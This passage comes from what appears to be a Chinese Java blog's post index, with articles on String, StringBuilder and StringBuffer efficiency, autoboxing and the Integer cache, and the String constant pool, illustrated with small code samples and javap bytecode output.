simple”).append(“ test”); 你会很惊讶的发现，生成 String S1 对象的速度简直太快了，而这个时候 StringBuffer 居然速度上根本一点都不占优势。 其实这是 JVM 的一个把戏，在 JVM 眼里，这个String S1 = “This is only a” + “ simple” + “test”; 其实就是：String S1 = “This is only a simple test”;所以当然不需要太多的时间了。但大家这里要注意的是，如果你的字符串是来自另外的 String 对象的话，速度就没那么快了，譬如： 1234String S2 = “This is only a”;String S3 = “ simple”;String S4 = “ test”;String S1 = S2 + S3 + S4; 这时候 JVM 会规规矩矩的按照原来的方式去做。 StringBuffer 和 StringBuilder 的区别那么有人会问既然有了StringBuilder类，为什么还需要StringBuffer类？查看源代码便一目了然，事实上，StringBuilder和StringBuffer类拥有的成员属性以及成员方法基本相同，区别是StringBuffer类的成员方法前面多了一个关键字：synchronized，不用多说，这个关键字是在多线程访问时起到安全保护作用的,也就是说StringBuffer是线程安全的。 下面摘了2段代码分别来自StringBuffer和StringBuilder，insert方法的具体实现： StringBuilder的insert方法 1234public StringBuilder insert(int index, char str[], int offset, int len) &#123; super.insert(index, str, offset, len); return this;&#125; StringBuffer的insert方法： 12345public synchronized StringBuffer insert(int index, char str[], int offset, int len)&#123; super.insert(index, str, offset, len); return this;&#125; 结论 对于直接相加字符串，效率很高，因为在编译器便确定了它的值，也就是说形如”I”+”love”+”java”; 的字符串相加，在编译期间便被优化成了”Ilovejava”。这个可以用javap -c命令反编译生成的class文件进行验证。 对于间接相加（即包含字符串引用），形如s1+s2+s3; 效率要比直接相加低，因为在编译器不会对引用变量进行优化。 String、StringBuilder、StringBuffer三者的执行效率：StringBuilder &gt; StringBuffer &gt; String 当字符串相加操作或者改动较少的情况下，建议使用 String str=”hello”这种形式； 当字符串相加操作较多的情况下，建议使用StringBuilder，如果采用了多线程，则使用StringBuffer。 Reference 《Thinking in Java》 探秘Java中的String、StringBuilder以及StringBuffer - https://www.cnblogs.com/dolphin0520/p/3778589.html String,StringBuffer, StringBuilder 的区别是什么？String为什么是不可变的？ - https://juejin.im/post/5a5d5c66f265da3e261bf46c String,StringBuffer与StringBuilder的区别?? - https://www.imooc.com/article/22988","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】装箱（Boxing）与拆箱（Unboxing）","date":"2019-03-11T04:37:42.000Z","path":"2019/03/11/【Java】基本数据类型-装箱与拆箱/","text":"背景基本数据类型基本类型，或者叫做内置类型，是Java中不同于类（Class）的特殊类型。它们是我们编程中使用最频繁的类型。 Java是一种强类型语言，第一次申明变量必须说明数据类型，第一次变量赋值称为变量的初始化。 Java基本类型共有八种，基本类型可以分为三类： 字符类型char 布尔类型boolean 数值类型： 整型：byte、short、int、long 浮点型：float、double Java中的数值类型不存在无符号的，它们的取值范围是固定的，不会随着机器硬件环境或者操作系统的改变而改变。 实际上，Java中还存在另外一种基本类型void，它也有对应的包装类 java.lang.Void，不过我们无法直接对它们进行操作。 基本数据类型有什么好处 我们都知道在Java语言中，new一个对象是存储在堆里的，我们通过栈中的引用来使用这些对象；所以，对象本身来说是比较消耗资源的。 对于经常用到的类型，如int等，如果我们每次使用这种变量的时候都需要new一个Java对象的话，就会比较笨重。所以，和C++一样，Java提供了基本数据类型，这种数据的变量不需要使用new创建，他们不会在堆上创建，而是直接在栈内存中存储，因此会更加高效。 包装类（Wrapper Class）Java语言是一个面向对象的语言，但是Java中的基本数据类型却是不面向对象的，这在实际使用时存在很多的不便，为了解决这个不足，在设计类时为每个基本数据类型设计了一个对应的类进行代表，这样八个和基本数据类型对应的类统称为包装类（Wrapper Class）。 包装类均位于java.lang包，包装类和基本数据类型的对应关系如下表所示 基本数据类型 包装类 byte Byte boolean Boolean short Short char Character int Integer long Long float Float double Double 在这八个类名中，除了Integer和Character类以后，其它六个类的类名和基本数据类型一致，只是类名的第一个字母大写即可。 为什么需要包装类 很多人会有疑问，既然Java中为了提高效率，提供了八种基本数据类型，为什么还要提供包装类呢？ 这个问题，其实前面已经有了答案，因为Java是一种面向对象语言，很多地方都需要使用对象而不是基本数据类型。比如，在集合类中，我们是无法将int 、double等类型放进去的。因为集合的容器要求元素是Object类型。 为了让基本类型也具有对象的特征，就出现了包装类型，它相当于将基本类型“包装起来”，使得它具有了对象的性质，并且为其添加了属性和方法，丰富了基本类型的操作。 什么是装箱（Boxing）和拆箱（Unboxing）？那么，有了基本数据类型和包装类，肯定有些时候要在他们之间进行转换。比如把一个基本数据类型的int转换成一个包装类型的Integer对象。 我们认为包装类是对基本类型的包装，所以，把基本数据类型转换成包装类的过程就是打包装，英文对应于boxing，中文翻译为装箱。 反之，把包装类转换成基本数据类型的过程就是拆包装，英文对应于unboxing，中文翻译为拆箱。 在 Java SE5 之前，如果要生成一个数值为 10 的 Integer 对象，必须这样进行： 1Integer i = new Integer(10); 自动拆箱与自动装箱而在从 Java SE5 开始就提供了自动装箱的特性，如果要生成一个数值为 10 的 Integer 对象，只需要这样就可以了： 1Integer i = 10; 这个过程中会自动根据数值创建对应的 Integer 对象，这就是自动装箱（auto-boxing）。 那什么是自动拆箱（auto-unboxing）呢？顾名思义，跟装箱对应，就是自动将包装器类型转换为基本数据类型。 比如 12Integer i = 10; //自动装箱int n = i; //自动拆箱 简单一点说， 自动装箱就是自动将基本数据类型转换为包装器类型； 自动拆箱就是自动将包装器类型转换为基本数据类型。 自动装箱和自动拆箱的实现原理Interger 类的自动装箱/拆箱我们以 Interger 类为例，下面看一段代码： 123456public class Main &#123; public static void main(String[] args) &#123; Integer i = 10; int n = i; &#125;&#125; 对 .class 文件进行javap之后得到如下内容： 1234567891011121314151617public class com.concretepage.lang.VolatileTest &#123; public com.concretepage.lang.VolatileTest(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.\"&lt;init&gt;\":()V 4: return public static void main(java.lang.String[]); Code: 0: bipush 10 2: invokestatic #2 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer; 5: astore_1 6: aload_1 7: invokevirtual #3 // Method java/lang/Integer.intValue:()I 10: istore_2 11: return&#125; 从反编译得到的字节码内容可以看出，int的自动装箱都是通过Integer.valueOf()方法来实现的，Integer的自动拆箱都是通过integer.intValue来实现的。 对源代码进行反编译后，可以得到以下代码： 1234public static void main(String[]args)&#123; Integer integer=Integer.valueOf(1); int i=integer.intValue(); &#125; 这也应证了我们上面的分析。 其他包装类的自动装箱/拆箱其他的也类似，比如Double、Character，不相信的朋友可以自己手动尝试一下。 因此可以用一句话总结装箱和拆箱的实现过程： 装箱过程是通过调用包装器的 valueOf 方法实现的，而拆箱过程是通过调用包装器的 xxxValue 方法实现的（xxx代表对应的基本数据类型）。 哪些地方会自动拆/装箱下表是基本数据类型对应的包装器类型： int（4字节） Integer byte（1字节） Byte short（2字节） Short long（8字节） Long float（4字节） Float double（8字节） Double char（2字节） Character boolean（未定） Boolean 当表格中左边列出的基础类型与它们的包装类有如下几种情况时，编译器会自动帮我们进行装箱或拆箱： 进行 = 赋值操作（装箱或拆箱） 进行+，-，*，/混合运算 （拆箱） 进行&gt;，&lt;，==比较运算（拆箱） 调用equals进行比较（装箱） 对ArrayList，HashMap等集合类的添加基础类型数据时（装箱） 场景一 将基本数据类型放入集合类我们知道，Java中的集合类只能接收对象类型，那么以下代码为什么会不报错呢？ 1234List&lt;Integer&gt; li = new ArrayList&lt;&gt;();for (int i = 1; i &lt; 50; i ++)&#123; li.add(i);&#125; 将上面代码进行反编译，可以得到以下代码： 1234List&lt;Integer&gt; li = new ArrayList&lt;&gt;();for (int i = 1; i &lt; 50; i += 2)&#123; li.add(Integer.valueOf(i));&#125; 以上，我们可以得出结论，当我们把基本数据类型放入集合类中的时候，会进行自动装箱。 场景二 包装类型和基本类型的大小比较有没有人想过，当我们对Integer对象与基本类型进行大小比较的时候，实际上比较的是什么内容呢？看以下代码： 1234Integer a=1;System.out.println(a==1?\"等于\":\"不等于\");Boolean bool=false;System.out.println(bool?\"真\":\"假\"); 对以上代码进行反编译，得到以下代码： 1234Integer a=1;System.out.println(a.intValue()==1?\"等于\":\"不等于\");Boolean bool=false;System.out.println(bool.booleanValue?\"真\":\"假\"); 可以看到，包装类与基本数据类型进行比较运算，是先将包装类进行拆箱成基本数据类型，然后进行比较的。 场景三 包装类型的运算有没有人想过，当我们对Integer对象进行四则运算的时候，是如何进行的呢？看以下代码： 123Integer i = 10;Integer j = 20;System.out.println(i+j); 反编译后代码如下： 123Integer i = Integer.valueOf(10);Integer j = Integer.valueOf(20);System.out.println(i.intValue() + j.intValue()); 我们发现，两个包装类型之间的运算，会被自动拆箱成基本类型进行。 场景四 三目运算符的使用这是很多人不知道的一个场景，作者也是一次线上的血淋淋的Bug发生后才了解到的一种案例。看一个简单的三目运算符的代码： 1234boolean flag = true;Integer i = 0;int j = 1;int k = flag ? i : j; 很多人不知道，其实在int k = flag ? i : j;这一行，会发生自动拆箱。反编译后代码如下： 12345boolean flag = true;Integer i = Integer.valueOf(0);int j = 1;int k = flag ? i.intValue() : j;System.out.println(k); 这其实是三目运算符的语法规范。当第二，第三位操作数分别为基本类型和对象时，其中的对象就会拆箱为基本类型进行操作。 因为例子中，flag ? i : j;片段中，第二段的i是一个包装类型的对象，而第三段的j是一个基本类型，所以会对包装类进行自动拆箱。如果这个时候i的值为null，那么久会发生NullPointerException。 场景五、函数参数与返回值这个比较容易理解，直接上代码了： 12345678//自动拆箱public int getNum1(Integer num) &#123; return num;&#125;//自动装箱public Integer getNum2(int num) &#123; return num;&#125; 缓存池new Integer(123) 与 Integer.valueOf(123) 的区别在于： new Integer(123) 每次都会新建一个对象； Integer.valueOf(123) 会使用缓存池中的对象，多次调用会取得同一个对象的引用。 123456Integer x = new Integer(123);Integer y = new Integer(123);System.out.println(x == y); // falseInteger z = Integer.valueOf(123);Integer k = Integer.valueOf(123);System.out.println(z == k); // trueCopy to clipboardErrorCopied valueOf() 方法的实现比较简单，就是先判断值是否在缓存池中，如果在的话就直接返回缓存池的内容。 自动拆装箱与缓存Java SE的自动拆装箱还提供了一个和缓存有关的功能，我们先来看以下代码，猜测一下输出结果： 123456789101112131415161718public static void main(String... strings) &#123; Integer integer1 = 3; Integer integer2 = 3; if (integer1 == integer2) System.out.println(\"integer1 == integer2\"); else System.out.println(\"integer1 != integer2\"); Integer integer3 = 300; Integer integer4 = 300; if (integer3 == integer4) System.out.println(\"integer3 == integer4\"); else System.out.println(\"integer3 != integer4\");&#125; 我们普遍认为上面的两个判断的结果都是false。虽然比较的值是相等的，但是由于比较的是对象，而对象的引用不一样，所以会认为两个if判断都是false的。在Java中，==比较的是对象应用，而equals比较的是值。所以，在这个例子中，不同的对象有不同的引用，所以在进行比较的时候都将返回false。奇怪的是，这里两个类似的if条件判断返回不同的布尔值。 上面这段代码真正的输出结果： 12integer1 == integer2integer3 != integer4 原因就和Integer中的缓存机制有关。在Java 5中，在Integer的操作上引入了一个新功能来节省内存和提高性能。整型对象通过使用相同的对象引用实现了缓存和重用： 适用于整数值区间-128 至 +127。 只适用于自动装箱。使用构造函数创建对象不适用。 我们只需要知道，当需要进行自动装箱时，如果数字在-128至127之间时，会直接使用缓存中的对象，而不是重新创建一个对象。 其中的javadoc详细的说明了缓存支持-128到127之间的自动装箱过程。最大值127可以通过-XX:AutoBoxCacheMax=size修改。 实际上这个功能在Java 5中引入的时候,范围是固定的-128 至 +127。后来在Java 6中，可以通过java.lang.Integer.IntegerCache.high设置最大值。 这使我们可以根据应用程序的实际情况灵活地调整来提高性能。到底是什么原因选择这个-128到127范围呢？因为这个范围的数字是最被广泛使用的。 在程序中，第一次使用Integer的时候也需要一定的额外时间来初始化这个缓存。 面试中相关的问题虽然大多数人对装箱和拆箱的概念都清楚，但是在面试和笔试中遇到了与装箱和拆箱的问题却不一定会答得上来。下面列举一些常见的与装箱/拆箱有关的面试题。 问题1下面这段代码的输出结果是什么？ 123456789101112public class Main &#123; public static void main(String[] args) &#123; Integer i1 = 100; Integer i2 = 100; Integer i3 = 200; Integer i4 = 200; System.out.println(i1==i2); System.out.println(i3==i4); &#125;&#125; 事实上输出结果是： 12truefalse 为什么会出现这样的结果？输出结果表明i1和i2指向的是同一个对象，而i3和i4指向的是不同的对象。此时只需一看源码便知究竟，下面这段代码是Integer的valueOf方法的具体实现： 123456public static Integer valueOf(int i) &#123; if(i &gt;= -128 &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + 128]; else return new Integer(i); &#125; 而其中IntegerCache类的实现为： 123456789101112131415161718192021222324252627private static class IntegerCache &#123; static final int high; static final Integer cache[]; static &#123; final int low = -128; // high value may be configured by property int h = 127; if (integerCacheHighPropValue != null) &#123; // Use Long.decode here to avoid invoking methods that // require Integer's autoboxing cache to be initialized int i = Long.decode(integerCacheHighPropValue).intValue(); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE h = Math.min(i, Integer.MAX_VALUE - -low); &#125; high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k &lt; cache.length; k++) cache[k] = new Integer(j++); &#125; private IntegerCache() &#123;&#125; &#125; 从这 2 段代码可以看出，在通过 valueOf 方法创建 Integer 对象的时候，如果数值在 [-128,127] 之间，便返回指向 IntegerCache.cache 中已经存在的对象的引用；否则创建一个新的 Integer 对象。 上面的代码中i1和i2的数值为100，因此会直接从cache中取已经存在的对象，所以i1和i2指向的是同一个对象，而i3和i4则是分别指向不同的对象。 问题2123456789101112public class Main &#123; public static void main(String[] args) &#123; Double i1 = 100.0; Double i2 = 100.0; Double i3 = 200.0; Double i4 = 200.0; System.out.println(i1==i2); System.out.println(i3==i4); &#125;&#125; 实际输出结果为： 12falsefalse 为什么Double类的valueOf方法会采用与Integer类的valueOf方法不同的实现？ 很简单：在某个范围内的整型数值的个数是有限的，而浮点数却不是。 注意，Integer、Short、Byte、Character、Long这几个类的valueOf方法的实现是类似的。 Double、Float的valueOf方法的实现是类似的。 问题3下面这段代码输出结果是什么： 123456789101112public class Main &#123; public static void main(String[] args) &#123; Boolean i1 = false; Boolean i2 = false; Boolean i3 = true; Boolean i4 = true; System.out.println(i1==i2); System.out.println(i3==i4); &#125;&#125;s 输出结果是： 12truetrue 至于为什么是这个结果，同样地，看了Boolean类的源码也会一目了然。下面是Boolean的valueOf方法的具体实现： 12345678910public static Boolean valueOf(boolean b) &#123; return (b ? TRUE : FALSE); &#125; public static final Boolean TRUE = new Boolean(true); /** * The &lt;code&gt;Boolean&lt;/code&gt; object corresponding to the primitive * value &lt;code&gt;false&lt;/code&gt;. */ public static final Boolean FALSE = new Boolean(false); 问题4 - ”==“的含义这是一个比较容易出错的地方，”==“可以用于字面量的比较，也可以用于对象的比较。 当用于字面量与字面量之间比较时，比较的是字面量值本身是否相等。 当用于字面量与对象之间比较时，会先将包装类对象进行自动拆箱（autounboxing）操作，此后比较的是字面量值本身是否相等。 而当用于对象与对象之间比较时，比较的不是对象代表的值，而是检查两个对象（在堆中）是否是同一对象，这个比较过程中没有自动装箱发生。 12345678910111213141516171819202122232425262728public class AutoboxingTest &#123; public static void main(String args[]) &#123; // Example 1: == comparison pure primitive – no autoboxing int i1 = 1; int i2 = 1; System.out.println(\"i1==i2 : \" + (i1 == i2)); // true // Example 2: equality operator mixing object and primitive Integer num1 = 1; // autoboxing int num2 = 1; System.out.println(\"num1 == num2 : \" + (num1 == num2)); // true // Example 3: special case - arises due to autoboxing in Java Integer obj1 = 1; // autoboxing will call Integer.valueOf() Integer obj2 = 1; // same call to Integer.valueOf() will return same // cached Object System.out.println(\"obj1 == obj2 : \" + (obj1 == obj2)); // true // Example 4: equality operator - pure object comparison Integer one = new Integer(1); // no autoboxing Integer anotherOne = new Integer(1); System.out.println(\"one == anotherOne : \" + (one == anotherOne)); // false &#125;&#125; 自动装/拆箱的性能问题我们来看看 Integer i = new Integer(xxx)和Integer i =xxx; 这两种方式的区别： 第一种方式不会触发自动装箱的过程；而第二种方式会触发； 在执行效率和资源占用上的区别。第二种方式的执行效率和资源占用在一般性情况下要优于第一种情况（注意这并不是绝对的）。 例子如果我告诉你：“只要修改一个字符，下面这段代码的运行速度就能提高5倍。”，你觉得可能么？ 1234567long t = System.currentTimeMillis();Long sum = 0L;for (long i = 0; i &lt; Integer.MAX_VALUE; i++) &#123; sum += i;&#125;System.out.println(\"total:\" + sum);System.out.println(\"processing time: \" + (System.currentTimeMillis() - t) + \" ms\"); 输出结果： 总数：2305843005992468481处理时间：6756 ms 仔细琢磨一下，你可能会想到下面这种执行速度更快的实现方法： 12345678long t = System.currentTimeMillis();//Long sum = 0L;long sum = 0L;for (long i = 0; i &lt; Integer.MAX_VALUE; i++) &#123; sum += i;&#125;System.out.println(\"total:\" + sum);System.out.println(\"processing time: \" + (System.currentTimeMillis() - t) + \" ms\") ; 输出结果： 总数：2305843005992468481处理时间：1248 ms 分析 事实上，第一段代码段会自动转化为如下代码。所以，导致处理时间较长的原因也就水落石出了：不必要地创建了2147483647个”Long“类型实例。 1234567long t = System.currentTimeMillis();Long sum = 0L;for (long i = 0; i &lt; Integer.MAX_VALUE; i++) &#123; sum += new Long(i);&#125;System.out.println(\"total:\" + sum);System.out.println(\"processing time: \" + (System.currentTimeMillis() - t) + \" ms\") ; Reference 深入剖析Java中的装箱和拆箱 - https://www.cnblogs.com/dolphin0520/p/3780005.html Java中的自动装箱与拆箱 - https://droidyue.com/blog/2015/04/07/autoboxing-and-autounboxing-in-java/ 5分钟彻底理解-Java自动装箱、拆箱 - https://juejin.im/post/5b5183e7e51d451912531cb5 Java 性能要点：自动装箱/ 拆箱 (Autoboxing / Unboxing) - http://blog.oneapm.com/apm-tech/635.html 一文读懂什么是Java中的自动拆装箱 - https://juejin.im/post/5b8de48951882542d63b4662","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】String - String 类和常量池","date":"2019-03-11T03:41:11.000Z","path":"2019/03/11/【Java】String-类和常量池/","text":"String 类概览String 被声明为 final，因此它不可被继承。 在 Java 8 中，String 内部使用 char 数组存储数据。 12345public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123; /** The value is used for character storage. */ private final char value[];&#125;Copy to clipboardErrorCopied 在 Java 9 之后，String 类的实现改用 byte 数组存储字符串，同时使用 coder 来标识使用了哪种编码。 12345678public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123; /** The value is used for character storage. */ private final byte[] value; /** The identifier of the encoding used to encode the bytes in &#123;@code value&#125;. */ private final byte coder;&#125;Copy to clipboardErrorCopied value 数组被声明为 final，这意味着 value 数组初始化之后就不能再引用其它数组。并且 String 内部没有改变 value 数组的方法，因此可以保证 String 不可变。 String 对象的两种创建方式1234567String str1 = \"abcd\";String str2 = new String(\"abcd\");String str3 = new String(\"abcd\");System.out.println(str1 == str2); //falseSystem.out.println(str1 == str3); //falseSystem.out.println(str2 == str3); //false 这两种不同的创建 String 对象实例的方法是有差别的： 第一种方式是直接指向一个字符串常量池（String Constant Pool）中的”abcd”字符串对象的引用； 第二种方式是直接在堆（Heap）内存中创建一个新的对象，而这个对象的 value 指向了”abcd”字符串对象。 记住：只要使用了 new 关键字，便会在堆中创建新的对象。 String类不可变性String是不可变的、final的。Java在运行时也保存了一个字符串常量池（String Constant Pool），这使得String成为了一个特别的类。 好处： 只有当字符串是不可变的，字符串常量池才有可能实现。字符串池的实现可以在运行时节约很多heap空间，因为不同的字符串变量都指向池中的同一个字符串。但如果字符串是可变的，那么String的interning将不能实现（String的interning是指对不同的字符串仅仅只保存一个，即不会保存多个相同的字符串)，因为这样的话，如果变量改变了它的值，那么其它指向这个值的变量的值也会一起改变。 如果字符串是可变的，那么会引起很严重的安全问题。譬如，数据库的用户名、密码都是以字符串的形式传入来获得数据库的连接，或者在socket编程中，主机名和端口都是以字符串的形式传入。 因为字符串是不可变的，所以它的值是不可改变的，否则黑客们可以钻到空子，改变字符串指向的对象的值，造成安全漏洞。 因为字符串是不可变的，所以是多线程安全的，同一个字符串实例可以被多个线程共享。这样便不用因为线程安全问题而使用同步。字符串自己便是线程安全的。 类加载器要用到字符串，不可变性提供了安全性，以便正确的类被加载。譬如你想加载java.sql.Connection类，而这个值被改成了myhacked.Connection，那么会对你的数据库造成不可知的破坏。 因为字符串是不可变的，所以在它创建的时候hashcode就被缓存了，不需要重新计算。这就使得字符串很适合作为Map中的键，字符串的处理速度要快过其它的键对象。这就是HashMap中的键往往都使用字符串。 字符串常量池（String Constant Pool）设计思想 字符串的分配，和其他的对象分配一样，耗费高昂的时间与空间代价，作为最基础的数据类型，大量频繁的创建字符串，极大程度地影响程序的性能。 JVM 为了提高性能和减少内存开销，在实例化字符串常量的时候进行了一些优化： 为字符串开辟一个字符串常量池，类似于缓存区 创建字符串常量时，首先判断字符串常量池是否存在该字符串 存在该字符串，返回引用实例，不存在，实例化该字符串并放入池中 实现的基础 实现该优化的基础是因为字符串是不可变的（ummutable），可以不用担心数据冲突进行共享。 运行时实例创建的全局字符串池中有一个哈希表（StringTable），总是为池中每个唯一的字符串对象维护一个引用，这就意味着它们一直引用着字符串常量池中的对象，所以，在常量池中的这些字符串不会被垃圾收集器回收。 字符串池是一个典型的享元模式（flyweight pattern）实现。 例子 - 从字符串常量池中获取相应的字符串1234String str1 = “hello”;String str2 = “hello”;System.out.printl（\"str1 == str2\" : str1 == str2 ) //true 打印的 true 表明 str1 和 str2 均指向同一个堆空间中的对象。 字符串常量池在哪里字符串常量池中存放的是引用还是对象呢？ 字符串常量池存放的是对象引用，而不是对象。在 Java 中，对象都创建在堆内存中。 在 JDK6 以及以前的版本中，字符串的常量池是放在堆的 Perm 区（permanent space）的，Perm 区是一个类静态的区域，主要存储一些加载类的信息，常量池，方法片段等内容，默认大小只有4m，一旦常量池中大量使用 intern 是会直接产生 java.lang.OutOfMemoryError: PermGen space 错误的。 所以在 JDK7 的版本中，字符串常量池已经从 Perm 区移到正常的 Java Heap 区域了 在 HotSpot VM 里，通过一个 StringTable 类来实现字符串常量池（string constant pool）的。 StringTable 本质上是一个哈希表，里面存的是字符串字面量的引用（即我们用双引号括起来部分的引用，而不是字符串字面量实例本身），也就是说在堆中的某些字符串实例被这个 StringTable 引用之后，就等同被赋予了”驻留字符串”的身份。这个 StringTable 在每个 HotSpot VM 的实例只有一份，被所有的类共享。 例子 - 堆栈方法区存储字符串： 1234String str1 = “abc”;String str2 = “abc”;String str3 = new String(“abc”);String str4 = new String(“abc”); 字符串常量池的使用方法String 类型的常量池比较特殊，它的主要使用方法有两种： 直接使用双引号 String.intern() 直接使用双引号直接使用双引号声明出来的 String 对象会直接存储在字符串常量池中。 String.intern()使用 String 提供的 intern 方法。 String.intern() 是一个 Native 方法。 它的作用是：在运行时，如果在字符串常量池中，包含了一个等于此 String 对象内容的字符串，则返回字符串常量池中该字符串的引用；如果没有，则在字符串常量池中创建一个与此 String 内容相同的字符串，并返回字符串常量池中创建的字符串的引用。 1234567String s1 = new String(\"计算机\");String s2 = new String(\"计算机\").intern();String s3 = \"计算机\";System.out.println(s2);//计算机System.out.println(s1 == s2);//false，因为一个是堆内存中的String对象，一个是常量池中的String对象System.out.println(s3 == s2);//true，因为两个都是常量池中的String对象 事实上，在 String s2 = new String(&quot;计算机&quot;).intern(); 中的 intern是多余的。 因为，就算不用intern，计算机作为一个字面量也会被加载到Class文件的常量池，进而加入到运行时常量池中，为啥还要多此一举呢？ Java 中几种常量池的区分Class 文件常量池（constant pool）我们都知道，Class 文件中除了包含类的版本、字段、方法、接口等描述信息外，还有一项信息就是常量池表（constant pool table）。 常量池表（constant pool table）用于存放编译器生成的各种字面量（Literal）和符号引用（Symbolic References）。 字面量（Literal）在计算机科学中，字面量（literal）是用于表达源代码中一个固定值的表示法（notation）。几乎所有计算机编程语言都具有对基本值的字面量表示，诸如：整数、浮点数以及字符串；而有很多也对布尔类型和字符类型的值也支持字面量表示；还有一些甚至对枚举类型的元素以及像数组、记录和对象等复合类型的值也支持字面量表示法。 说简单点，字面量就是指由字母、数字等构成的字符串或者常量数值（声明为 final 的常量值）。 符号引用（Symbolic References）符号引用（Symbolic References）是一组符号来描述所引用的目标，符号可以是任何形式的字面量，只要使用时能无歧义地定位到目标即可（符号引用是相对于直接引用来说，直接引用一般是指向方法区的本地指针，相对偏移量或是一个能间接定位到目标的句柄）。一般包括下面三类常量： 类和接口的全限定名：例如对于String这个类，它的全限定名就是java/lang/String。 字段的名称和描述符：所谓字段就是类或者接口中声明的变量，包括类级别变量（static）和实例级的变量。 方法的名称和描述符：所谓描述符就相当于方法的参数类型+返回值类型。 通过javap命令可以查看一个指定Class文件的常量池内容： 对于程序： 1234567class Meal &#123; public Meal() &#123; String a = \"test1\"; String b = \"test2\"; String c = \"test3\"; &#125;&#125; 执行 javap 可以得到以下内容： 1234567891011121314151617181920212223242526272829303132333435363738$ javap -v MealWarning: Binary file Meal contains com.concretepage.lang.MealClassfile /Users/weishi/Desktop/不常用/JavaTest/out/production/JavaTest/com/concretepage/lang/Meal.class Last modified 10-Jul-2019; size 402 bytes MD5 checksum 7cc2182c557c8f788f22799de50f8792 Compiled from \"Test.java\"class com.concretepage.lang.Meal minor version: 0 major version: 52 flags: ACC_SUPERConstant pool: #1 = Methodref #6.#20 // java/lang/Object.\"&lt;init&gt;\":()V #2 = String #21 // test1 #3 = String #22 // test2 #4 = String #23 // test3 #5 = Class #24 // com/concretepage/lang/Meal #6 = Class #25 // java/lang/Object #7 = Utf8 &lt;init&gt; #8 = Utf8 ()V #9 = Utf8 Code #10 = Utf8 LineNumberTable #11 = Utf8 LocalVariableTable #12 = Utf8 this #13 = Utf8 Lcom/concretepage/lang/Meal; #14 = Utf8 a #15 = Utf8 Ljava/lang/String; #16 = Utf8 b #17 = Utf8 c #18 = Utf8 SourceFile #19 = Utf8 Test.java #20 = NameAndType #7:#8 // \"&lt;init&gt;\":()V #21 = Utf8 test1 #22 = Utf8 test2 #23 = Utf8 test3 #24 = Utf8 com/concretepage/lang/Meal #25 = Utf8 java/lang/Object ...SourceFile: \"Test.java\" 运行时常量池（Runtime constant pool）运行时常量池（runtime constant pool），又称为动态常量池 ，是 JVM 在完成加载类之后，将 Class 文件中常量池载入到内存中，并保存在方法区中。 也就是说，运行时常量池中的常量，直接来源于或基于各个 Class 文件中的 Class 文件常量池。 运行时常量池与 Class 文件常量池区别 JVM 对 Class文件中每一部分的格式都有严格的要求，每一个字节用于存储那种数据都必须符合规范上的要求才会被虚拟机认可、装载和执行；但运行时常量池没有这些限制，除了保存Class文件中描述的符号引用，还会把翻译出来的直接引用也存储在运行时常量区。 相较于Class文件常量池，运行时常量池更具动态性，在运行期间也可以将新的变量放入常量池中，而不是一定要在编译时确定的常量才能放入。最主要的运用便是 String 类的 intern() 方法。 总结 字符串常量池（String Constant Pool）在每个VM中只有一份，存放的是字符串常量的引用值。 Class 文件常量池是在编译的时候每个 Class 都有的，在编译阶段，存放的是常量的符号引用。 运行时常量池是在类加载完成之后，将每个 Class 文件常量池中的符号引用值转存到运行时常量池中，也就是说，运行时常量池只有一个。 特殊讨论问题1 - JVM 对字符串拼接的优化你知道下面的代码，会创建几个字符串对象，在字符串常量池中保存几个引用么？ 1String test = \"a\" + \"b\" + \"c\"; 分析答案是只创建了一个对象，在字符串常量池中也只保存一个引用。我们使用 javap 反编译看一下即可得知。 12345public static void main(java.lang.String[]); Code: 0: ldc #2 // String abc 2: astore_1 3: return 实际上，在编译期间，JVM 已经将这三个字面量合成了一个。这样做实际上是一种优化，避免了创建多余的字符串对象，也没有发生字符串拼接问题。 问题2 - 转换为 StringBuilder 对象 在 Java 中，唯一被重载的运算符就是用于 String 的“+”与“+=”。除此之外，Java 不允许程序员重载其他的运算符。 我们来看一个例子： 123String a = \"abc\";String b = \"mongo\";String info = a + b + 47; 由于 String 对象是不可变的，从表面上看上述的代码过程中可能会是这样工作的： &quot;abc&quot; + &quot;mongo&quot; 会创建一个新的 String 对象，其 value 为abcmongo ； &quot;abcmongo&quot; + &quot;47&quot; 也会创建一个新的 String 对象 ，其值为 abcmongo47 ；、 info 指向最终生成的 String 对象。 但是，这样的处理方式会生成大量的需要被进行垃圾回收的中间对象，性能相当糟糕。 分析我们使用 javap 看看上面代码对应的汇编代码，以了解 JVM 到底是如何进行处理的： 12345678910111213141516171819 public static void main(java.lang.String[]); Code: 0: ldc #2 // String abc 2: astore_1 3: ldc #3 // String mongo 5: astore_2 6: new #4 // class java/lang/StringBuilder 9: dup 10: invokespecial #5 // Method java/lang/StringBuilder.\"&lt;init&gt;\":()V 13: aload_1 14: invokevirtual #6 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 17: aload_2 18: invokevirtual #6 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 21: bipush 47 23: invokevirtual #7 // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder; 26: invokevirtual #8 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 29: astore_3 30: return&#125; 可以看到，编译器自动引入了 StringBuilder 类。 编译器先创建了一个 StringBuilder 对象，并 3 次调用 StringBuilder.append() 方法，最后调用 toString() 生成 abcmongo47，从而避免中间对象的性能损耗。 问题3 - 连接表达式 “+” 使用后相等问题 使用“+”连接多个字符串，且每个字符串都是字面量时，在编译阶段，就会进行字符串的连接，并将最终连接完成产生的 String 对象放入字符串常量池中。 使用“+”连接多个字符串，如果任何一个字符串是字符串引用（而不是字面值），则所产生的新 String 对象不会被放入到字符串池中。 12345678String str1 = \"str\";String str2 = \"ing\";String str3 = \"str\" + 